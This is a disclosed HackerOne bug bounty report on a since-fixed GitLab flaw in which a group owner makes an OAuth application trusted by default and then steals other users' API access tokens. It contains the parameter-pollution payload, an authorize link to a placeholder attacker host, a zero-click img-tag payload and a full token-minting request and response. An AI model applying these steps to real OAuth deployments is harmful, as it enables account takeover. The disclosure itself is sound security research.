---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/improper-authentication-generic
  - env/web
  - stack/gitlab
substate: "resolved"
weakness: "Improper Authentication - Generic"
enriched: true
body: true
date: 2025-07-23
submitted: 2021-04-04T11:00:27.707Z
bounty_usd: 5580
votes: 140
cve: []
program: "[[programs/gitlab|GitLab]]"
reporter: "timothyleung"
source: "https://hackerone.com/reports/1148364"
title: "Mint Oauth2 access token for targeted user"
---
# Mint Oauth2 access token for targeted user

> **Severity:** High | **Bounty:** 5,580 USD | **Votes:** 140 | **Program:** GitLab | **Disclosed:** 2025-07-23

- Report: [https://hackerone.com/reports/1148364](https://hackerone.com/reports/1148364)
- CWE: Improper Authentication - Generic
- Submitted: 2021-04-04T11:00:27.707Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

### Summary

It is possible to mint access token for targeted user. There is a flaw for group level application setup. It allows a group owner to create an application with user's trust by default. This bypassed the CSRF control for authorization flow. 

### Steps to reproduce


1. Login as user1 , create a group called malicious group

2. Create an Applications in Settings > Applications > api scope checked 

3. Open the created application and click Edit, intercept the request when you click "Save application", append the following 
`doorkeeper_application%5Btrusted%5D=0&doorkeeper_application%5Btrusted%5D=1& ` This will allow us to create an application that is trusted by default. This is an intended function for instance admin. 

4. Send the following link to the user, or put it in an img tag. 
https://gitlab.com/login/oauth/authorize?redirect_uri=http://<attacker-control>.com&client_id=9ff83fc426f95b5b5dec389ac02adf4ef800e4a0fb04faed6ffc8305f5fccf29&scope=api 

5. You will be able to see a request with the Code

6. You can mint the access token using the following endpoint. 
```
POST /login/oauth/access_token HTTP/1.1
Host: gdk.test:3000
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:87.0) Gecko/20100101 Firefox/87.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: perf_bar_enabled=true; experimentation_subject_id=eyJfcmFpbHMiOnsibWVzc2FnZSI6IkltTTBaR0ZsWWpWa0xXUXdPRFV0TkRjM05TMWlPRGxtTFRVMk5UYzJORFF3WXpsa01pST0iLCJleHAiOm51bGwsInB1ciI6ImNvb2tpZS5leHBlcmltZW50YXRpb25fc3ViamVjdF9pZCJ9fQ%3D%3D--364fb7d4479cb94e08660b9c20f6b7692c7e53a4; _gitlab_session_a577db8f7188ca777cf6a20a7928c67f45ba397ca4a4a162d17662b5e845194c=d114336bb9c2a113ff2e6d5542e17a63; known_sign_in=bGtzOVNNWWY1SitJVDBMUE5WS0VqbXBvbWRyRzhLaXdzKyt6L0FpanZIMndzYVhRUHZpYnlncjJFSFJzNEl3b0dvMlNaVEF4d25PRys4ZDFiYmgvRUpVRWRVdlVRL3YyUXNaUEx4LzExL25YTWk2KzBIUlg3dldFQlpkQ2dDL2YtLTc4cUhhZmJrK2JUckRvT0FONjBRZ1E9PQ%3D%3D--ddb6a3bf3b2faa846ab4a0b2e0ecef561f0c5a99; sidebar_collapsed=false
Upgrade-Insecure-Requests: 1
Content-Length: 223

code=6c53ef532f34762b8705029d4fd005d2c32d788d3e3a78151c1b5f6a2743dffc&client_id=04a5da53b6faaba4758fcb0e7bd80845795c9c838363568c9b4efcc0bcec1934&client_secret=9de25469a82dee694ae4e33e02a3e97156bec87ba905fc4e3e34b9de805f9dc4
```
Response
```
HTTP/1.1 200 OK
Cache-Control: max-age=0, private, must-revalidate, no-store
Content-Type: text/plain; charset=utf-8
Etag: W/"a219f8ac2bd29580e1f17894de3956da"
Pragma: no-cache
Referrer-Policy: strict-origin-when-cross-origin
X-Content-Type-Options: nosniff
X-Download-Options: noopen
X-Frame-Options: DENY
X-Gitlab-Feature-Category: integrations
X-Permitted-Cross-Domain-Policies: none
X-Request-Id: 01F2E6M6TER14PB17H6XCDC0B3
X-Runtime: 0.257708
X-Ua-Compatible: IE=edge
X-Xss-Protection: 1; mode=block
Date: Sun, 04 Apr 2021 10:25:03 GMT
Content-Length: 105
Connection: close

access_token=bc3450dfcc2fb46eece85d1f74d96070f94cd35e656b184706027227243d5338&scope=api&token_type=Bearer
``` 

(Step-by-step guide to reproduce the issue, including:)

(1. any preconditions in the environment)
(2. complete HTTP or API request, or)
(3. user action, )
(4. etc.)


### Impact

I believe you can gain api scope access to any targeted user. I will try to enable more scopes later.


### What is the current *bug* behavior?

Able to obtain user's code without consent and mint access token which can be used to do things on behalf of the user.

### What is the expected *correct* behavior?

Group owner should not be able to enable trusted by default when creating application.

## Impact

Gain access to targeted user's data.

## Timeline

- **Report Filed**
- **2021-04-04** @timothyleung: Recorded the exploitation process.
- **2021-04-04** @timothyleung: I believe a similar issue had been discussed here before - https://gitlab.com/gitlab-org/gitlab/-/issues/209087 

The first problem is that the group owner should not be able to make an application trusted by default. This seems to be a doorkeeper design but verification might need to be done before passing the request to doorkeeper. 

Another problem is that I was able to specify the `redirect_uri` to any domains, this was not verified because it is a special case when you hit the `login/oauth/authorize` endpoint. This endpoint is made for JIRA DVCS integration specifically. 
https://gitlab.com/gitlab-org/gitlab/-/blob/master/app/controllers/oauth/jira/authorizations_controller.rb#L14 

Hope that helps.
- **2021-04-04** @timothyleung: The exploit can be triggered by a GET request. It means we can basically embed the payload in a more popular website that developer uses. No clicks are required :) 

```
<html>
<img src="https://gitlab.com/login/oauth/authorize?redirect_uri=http://localhost:4444/&client_id=9ff83fc426f95b5b5dec389ac02adf4ef800e4a0fb04faed6ffc8305f5fccf29&scope=api">
</html>
```
- **2021-04-05** @timothyleung: I just had a look again and realize the JIRA part doesn't matter at all. I should hit the `/oauth/token` endpoint instead of `/login/oauth/access_token` endpoint. This will make the attack easier since the attacker has full control to the redirect_uri anyways. 

I have recorded the new attack scenario again, this will should be more straightforward. The only vulnerability here is that the group owner should not be able to make a group application trustable by default.
- **2021-04-05** @h1_analyst_everton: Hi @timothyleung,

Thank you for your submission. I hope you are well. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.

Have a great day! 

Kind regards,
@glassofbeer
- **2021-04-05** @h1_analyst_everton: Hi @timothyleung - I'm discussing this submission internally with the GitLab team. You will be updated as soon as there is additional information to share. Thanks for your patience!
- **Report Vulnerability Types Updated**
- **Report Triaged**
- **2021-04-06** @timothyleung: Thanks! Do you mind reviewing the severity of the finding as well? I used the CVSS calculator which gives me critical but I am not a big fan of making things "critical" all the time and hence I just leave it as High. https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N
- **2021-04-06** @rchan: Hi @timothyleung,

Yes, we will have a discussion about the CVSS of this finding soon, I'll let you know once we have a decision.

Thanks,
ROn
GitLab Security Team
- **2021-04-07** @rchan: Hi @timothyleung,

We've just pushed a fix on gitlab.com, can you please verify on your end and let us know?

Appreciate your help!

Thanks,
Ron
GitLab Security Team
- **2021-04-07** @timothyleung: Hi Ron, 
I have verified it and confirmed that I can no longer perform the attack. 

Tim
- **2021-04-14** @gitlab-securitybot: ETA for fix:

Hi @timothyleung,

The issue you reported is currently scheduled to be fixed by 2021-04-30.

Thank you again for contacting us!

Best regards,
GitLab Security Team
- **Report Resolved**
- **Bounty Awarded**
- **2021-04-20** @timothyleung: thanks for the  bounty! It was great to work with you :)
- **2021-04-21** @rchan: @timothyleung The feeling is mutual, keep up the good work!
- **Agreed On Going Public**
- **2021-05-22** @timothyleung: Happy to disclose this after the videos are removed.
- **2021-05-22** @dcouture: Done!
- **2021-07-12** @dcouture: Just a little ping if you're still willing to disclose the report!
- **Agreed On Going Public**
- **Report Became Public**
- **2025-07-23** @timothyleung: Can CVE be assigned? Thank you!
